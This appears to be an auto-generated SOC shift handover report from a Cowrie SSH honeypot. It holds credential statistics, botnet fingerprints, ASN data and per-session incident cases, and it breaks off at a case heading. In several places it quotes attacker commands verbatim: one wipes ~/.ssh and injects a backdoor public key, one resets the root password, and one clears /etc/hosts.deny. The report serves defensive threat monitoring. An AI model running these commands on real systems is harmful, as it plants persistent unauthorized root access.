# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-14 |
| **Generated At** | 2026-06-14T19:42:24Z |
| **Shift Time** | 19:42 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **215** |
| Confirmed Threats | **213** |
| False Positives Filtered | **2** (0.9%) |
| Unique Attacker IPs | **19** |
| Countries of Origin | **10** |
| High Severity Cases | **52** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **163** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **139** |
| Unique Credential Pairs | **88** |
| Unique Usernames | **53** |
| Unique Passwords | **86** |
| Successful Auth Pairs | **35** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 52 |
| `345gs5662d34` | 24 |
| `admin` | 5 |
| `git` | 3 |
| `ubuntu` | 3 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 24 |
| `3245gs5662d34` | 24 |
| `123456` | 3 |
| `linux` | 2 |
| `root2` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 24 |
| `root` | `3245gs5662d34` | 24 |
| `git` | `linux` | 2 |
| `root` | `root2` | 2 |
| `root` | `19951995` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `root2` | `103.67.78.49` | 2026-06-14T17:24:30 |
| `root` | `3245gs5662d34` | `103.67.78.49` | 2026-06-14T17:24:35 |
| `root` | `vps123` | `64.188.77.26` | 2026-06-14T17:25:19 |
| `root` | `3245gs5662d34` | `64.188.77.26` | 2026-06-14T17:25:23 |
| `root` | `19951995` | `103.67.78.49` | 2026-06-14T17:25:44 |
| `root` | `Affe123` | `103.67.78.49` | 2026-06-14T17:26:45 |
| `root` | `root2` | `64.188.77.26` | 2026-06-14T17:27:03 |
| `root` | `trust123` | `68.183.212.68` | 2026-06-14T17:27:47 |
| `root` | `3245gs5662d34` | `68.183.212.68` | 2026-06-14T17:27:51 |
| `root` | `alaska` | `68.183.212.68` | 2026-06-14T17:29:40 |
| `root` | `P@sSw0rd` | `64.188.77.26` | 2026-06-14T17:30:26 |
| `root` | `19951995` | `64.188.77.26` | 2026-06-14T17:32:14 |
| `root` | `penis123` | `43.130.90.166` | 2026-06-14T17:35:18 |
| `root` | `3245gs5662d34` | `43.130.90.166` | 2026-06-14T17:35:24 |
| `root` | `ASDzxc123` | `43.130.90.166` | 2026-06-14T17:36:40 |
| `root` | `Password12@` | `64.188.77.26` | 2026-06-14T17:37:20 |
| `root` | `asdASD1234` | `43.130.90.166` | 2026-06-14T17:37:24 |
| `root` | `js123456` | `43.130.90.166` | 2026-06-14T17:38:50 |
| `root` | `root.2026` | `43.130.90.166` | 2026-06-14T17:40:54 |
| `root` | `A123456789.` | `43.130.90.166` | 2026-06-14T17:42:56 |
| `root` | `Qwe123321` | `43.130.90.166` | 2026-06-14T17:45:08 |
| `root` | `Qwerty.1` | `43.130.90.166` | 2026-06-14T17:47:19 |
| `root` | `4815162342` | `43.130.90.166` | 2026-06-14T17:50:50 |
| `root` | `Huawei@1234` | `43.130.90.166` | 2026-06-14T17:51:38 |
| `root` | `P@ss1234` | `43.130.90.166` | 2026-06-14T17:53:01 |
| `root` | `ADMIN123admin` | `120.48.135.189` | 2026-06-14T18:03:00 |
| `root` | `q1w2e3r$` | `120.48.135.189` | 2026-06-14T18:05:40 |
| `root` | `3245gs5662d34` | `120.48.135.189` | 2026-06-14T18:05:53 |
| `root` | `aq1sw2` | `120.48.135.189` | 2026-06-14T18:24:23 |
| `root` | `Yr@123456` | `120.48.135.189` | 2026-06-14T18:37:18 |
| `root` | `456789` | `120.48.135.189` | 2026-06-14T18:45:12 |
| `root` | `Aa121314` | `144.48.243.18` | 2026-06-14T19:19:16 |
| `root` | `3245gs5662d34` | `144.48.243.18` | 2026-06-14T19:19:20 |
| `root` | `ll` | `71.71.250.77` | 2026-06-14T19:22:21 |
| `root` | `3245gs5662d34` | `71.71.250.77` | 2026-06-14T19:22:27 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **215** |
| Sessions with Fingerprint | **5** |
| Unique HASSH Fingerprints | **5** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 157 |
| AsyncSSH (Python) | 9 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 92 | 8 |
| `03a80b21afa8...` | Modern SSH client | 53 | 1 |
| `fda360b1b4f4...` | Mirai/variant | 9 | 2 |
| `873a5fb5fedc...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 92 | 8 | Mirai/variant |
| `03a80b21afa8...` | libssh | 53 | 1 | Modern SSH client |
| `95420f9d932d...` | libssh | 12 | 1 | — |
| `fda360b1b4f4...` | AsyncSSH (Python) | 9 | 2 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 4 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 24 | 7 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:ZjCUNz9DLnfw"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `120.48.135.189`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `64.188.77.26`, `144.48.243.18`, `71.71.250.77`, `43.130.90.166`, `103.67.78.49`, `68.183.212.68`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **19** |
| Unique ASNs | **18** |
| High-Risk ASNs | **16** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS14061` | DigitalOcean, LLC | 2 | HIGH |
| `AS11426` | Charter Communications Inc | 1 | HIGH |
| `AS132203` | Tencent Building, Kejizhongyi Avenue | 1 | HIGH |
| `AS9931` | National Telecom Public Company Limited | 1 | HIGH |
| `AS136052` | PT Cloud Hosting Indonesia | 1 | HIGH |
| `AS45102` | Alibaba (US) Technology Co., Ltd. | 1 | HIGH |
| `AS8075` | Microsoft Corporation | 1 | LOW |
| `AS56932` | CHP Poddubny Sergey Valentynovich | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (52)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-cbf6f8edef56

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-06-14 17:24 |
| **Last Seen** | 2026-06-14 17:24 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:24:29` | `cowrie.session.connect` |
| `2026-06-14 17:24:29` | `cowrie.client.version` |
| `2026-06-14 17:24:29` | `cowrie.client.kex` |
| `2026-06-14 17:24:30` | `cowrie.login.success` |
| `2026-06-14 17:24:30` | `cowrie.session.params` |
| `2026-06-14 17:24:30` | `cowrie.command.input` |
| `2026-06-14 17:24:30` | `cowrie.command.failed` |
| `2026-06-14 17:24:31` | `cowrie.log.closed` |
| `2026-06-14 17:24:31` | `cowrie.session.params` |
| `2026-06-14 17:24:31` | `cowrie.command.input` |
| `2026-06-14 17:24:32` | `cowrie.session.file_download` |
| `2026-06-14 17:24:32` | `cowrie.log.closed` |
| `2026-06-14 17:24:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-867c2c0378f2

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-06-14 17:24 |
| **Last Seen** | 2026-06-14 17:24 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:24:34` | `cowrie.session.connect` |
| `2026-06-14 17:24:34` | `cowrie.client.version` |
| `2026-06-14 17:24:34` | `cowrie.client.kex` |
| `2026-06-14 17:24:35` | `cowrie.login.success` |
| `2026-06-14 17:24:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-78710ceba55a

| Field | Detail |
|---|---|
| **Source IP** | `64.188.77[.]26` |
| **First Seen** | 2026-06-14 17:25 |
| **Last Seen** | 2026-06-14 17:25 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:25:19` | `cowrie.session.connect` |
| `2026-06-14 17:25:19` | `cowrie.client.version` |
| `2026-06-14 17:25:19` | `cowrie.client.kex` |
| `2026-06-14 17:25:19` | `cowrie.login.success` |
| `2026-06-14 17:25:20` | `cowrie.session.params` |
| `2026-06-14 17:25:20` | `cowrie.command.input` |
| `2026-06-14 17:25:20` | `cowrie.command.failed` |
| `2026-06-14 17:25:20` | `cowrie.log.closed` |
| `2026-06-14 17:25:20` | `cowrie.session.params` |
| `2026-06-14 17:25:20` | `cowrie.command.input` |
| `2026-06-14 17:25:20` | `cowrie.session.file_download` |
| `2026-06-14 17:25:20` | `cowrie.log.closed` |
| `2026-06-14 17:25:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.188.77[.]26` to AbuseIPDB if not already reported
- [ ] Block `64.188.77[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f13ebaad2e74

| Field | Detail |
|---|---|
| **Source IP** | `64.188.77[.]26` |
| **First Seen** | 2026-06-14 17:25 |
| **Last Seen** | 2026-06-14 17:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:25:22` | `cowrie.session.connect` |
| `2026-06-14 17:25:22` | `cowrie.client.version` |
| `2026-06-14 17:25:22` | `cowrie.client.kex` |
| `2026-06-14 17:25:23` | `cowrie.login.success` |
| `2026-06-14 17:25:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.188.77[.]26` to AbuseIPDB if not already reported
- [ ] Block `64.188.77[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6006e11f6398

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-06-14 17:25 |
| **Last Seen** | 2026-06-14 17:25 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:25:43` | `cowrie.session.connect` |
| `2026-06-14 17:25:43` | `cowrie.client.version` |
| `2026-06-14 17:25:43` | `cowrie.client.kex` |
| `2026-06-14 17:25:44` | `cowrie.login.success` |
| `2026-06-14 17:25:44` | `cowrie.session.params` |
| `2026-06-14 17:25:44` | `cowrie.command.input` |
| `2026-06-14 17:25:44` | `cowrie.command.failed` |
| `2026-06-14 17:25:44` | `cowrie.log.closed` |
| `2026-06-14 17:25:45` | `cowrie.session.params` |
| `2026-06-14 17:25:45` | `cowrie.command.input` |
| `2026-06-14 17:25:45` | `cowrie.session.file_download` |
| `2026-06-14 17:25:45` | `cowrie.log.closed` |
| `2026-06-14 17:25:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ac53c80c1f1

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-06-14 17:25 |
| **Last Seen** | 2026-06-14 17:25 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:25:48` | `cowrie.session.connect` |
| `2026-06-14 17:25:48` | `cowrie.client.version` |
| `2026-06-14 17:25:48` | `cowrie.client.kex` |
| `2026-06-14 17:25:49` | `cowrie.login.success` |
| `2026-06-14 17:25:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c72dcb00639

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-06-14 17:26 |
| **Last Seen** | 2026-06-14 17:26 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:26:44` | `cowrie.session.connect` |
| `2026-06-14 17:26:44` | `cowrie.client.version` |
| `2026-06-14 17:26:44` | `cowrie.client.kex` |
| `2026-06-14 17:26:45` | `cowrie.login.success` |
| `2026-06-14 17:26:46` | `cowrie.session.params` |
| `2026-06-14 17:26:46` | `cowrie.command.input` |
| `2026-06-14 17:26:46` | `cowrie.command.failed` |
| `2026-06-14 17:26:46` | `cowrie.log.closed` |
| `2026-06-14 17:26:46` | `cowrie.session.params` |
| `2026-06-14 17:26:46` | `cowrie.command.input` |
| `2026-06-14 17:26:47` | `cowrie.session.file_download` |
| `2026-06-14 17:26:47` | `cowrie.log.closed` |
| `2026-06-14 17:26:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d7e5f524dc1c

| Field | Detail |
|---|---|
| **Source IP** | `103.67.78[.]49` |
| **First Seen** | 2026-06-14 17:26 |
| **Last Seen** | 2026-06-14 17:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:26:49` | `cowrie.session.connect` |
| `2026-06-14 17:26:49` | `cowrie.client.version` |
| `2026-06-14 17:26:49` | `cowrie.client.kex` |
| `2026-06-14 17:26:50` | `cowrie.login.success` |
| `2026-06-14 17:26:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.78[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.67.78[.]49` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2845ec5e27c

| Field | Detail |
|---|---|
| **Source IP** | `64.188.77[.]26` |
| **First Seen** | 2026-06-14 17:27 |
| **Last Seen** | 2026-06-14 17:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:27:02` | `cowrie.session.connect` |
| `2026-06-14 17:27:02` | `cowrie.client.version` |
| `2026-06-14 17:27:02` | `cowrie.client.kex` |
| `2026-06-14 17:27:03` | `cowrie.login.success` |
| `2026-06-14 17:27:03` | `cowrie.session.params` |
| `2026-06-14 17:27:03` | `cowrie.command.input` |
| `2026-06-14 17:27:03` | `cowrie.command.failed` |
| `2026-06-14 17:27:03` | `cowrie.log.closed` |
| `2026-06-14 17:27:03` | `cowrie.session.params` |
| `2026-06-14 17:27:03` | `cowrie.command.input` |
| `2026-06-14 17:27:04` | `cowrie.session.file_download` |
| `2026-06-14 17:27:04` | `cowrie.log.closed` |
| `2026-06-14 17:27:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.188.77[.]26` to AbuseIPDB if not already reported
- [ ] Block `64.188.77[.]26` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1fe7b6f8ebd5

| Field | Detail |
|---|---|
| **Source IP** | `64.188.77[.]26` |
| **First Seen** | 2026-06-14 17:27 |
| **Last Seen** | 2026-06-14 17:27 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:27:06` | `cowrie.session.connect` |
| `2026-06-14 17:27:06` | `cowrie.client.version` |
| `2026-06-14 17:27:06` | `cowrie.client.kex` |
| `2026-06-14 17:27:06` | `cowrie.login.success` |
| `2026-06-14 17:27:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `64.188.77[.]26` to AbuseIPDB if not already reported
- [ ] Block `64.188.77[.]26` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bce7ab26c8d2

| Field | Detail |
|---|---|
| **Source IP** | `68.183.212[.]68` |
| **First Seen** | 2026-06-14 17:27 |
| **Last Seen** | 2026-06-14 17:27 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-14 17:27:47` | `cowrie.session.connect` |
| `2026-06-14 17:27:47` | `cowrie.client.version` |
| `2026-06-14 17:27:47` | `cowrie.client.kex` |
| `2026-06-14 17:27:47` | `cowrie.login.success` |
| `2026-06-14 17:27:48` | `cowrie.session.params` |
| `2026-06-14 17:27:48` | `cowrie.command.input` |
| `2026-06-14 17:27:48` | `cowrie.command.failed` |
| `2026-06-14 17:27:48` | `cowrie.log.closed` |
| `2026-06-14 17:27:48` | `cowrie.session.params` |
| `2026-06-14 17:27:48` | `cowrie.command.input` |
| `2026-06-14 17:27:48` | `cowrie.session.file_download` |
| `2026-06-14 17:27:48` | `cowrie.log.closed` |
| `2026-06-14 17:27:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `68.183.212[.]68` to AbuseIPDB if not already reported
- [ ] Block `68.183.212[.]68` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d181b60a150
